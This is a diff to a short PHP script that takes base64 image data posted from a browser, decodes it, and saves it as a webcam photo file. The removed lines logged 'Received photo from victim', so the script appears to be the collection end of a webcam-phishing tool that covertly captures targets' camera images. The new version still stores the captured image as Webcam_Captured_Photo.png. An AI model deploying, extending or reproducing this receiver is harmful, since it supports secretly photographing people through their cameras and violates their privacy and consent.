@@ -1,19 +1,15 @@
 <?php
 
-$date = date('dMYHis');
-$imageData=$_POST['cat'];
+$data=$_POST['data'];
 
-if (!empty($_POST['cat'])) {
-error_log("Received photo from victim." . "\r\n", 3, "Photos_logs.log");
-
-}
-
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
-
-exit();
+   $contents_split = explode(',', $data);
+   $encoded = $contents_split[count($contents_split)-1];
+   $decoded = "";
+   for ($i=0; $i < ceil(strlen($encoded)/256); $i++) {
+      $decoded = $decoded . base64_decode(substr($encoded,$i*256,256)); 
+   }
+   $data = $decoded; 
+$fp = fopen("Webcam_Captured_Photo.png", "w");
+fwrite($fp, $data);
+fclose($fp); 
 ?>
-
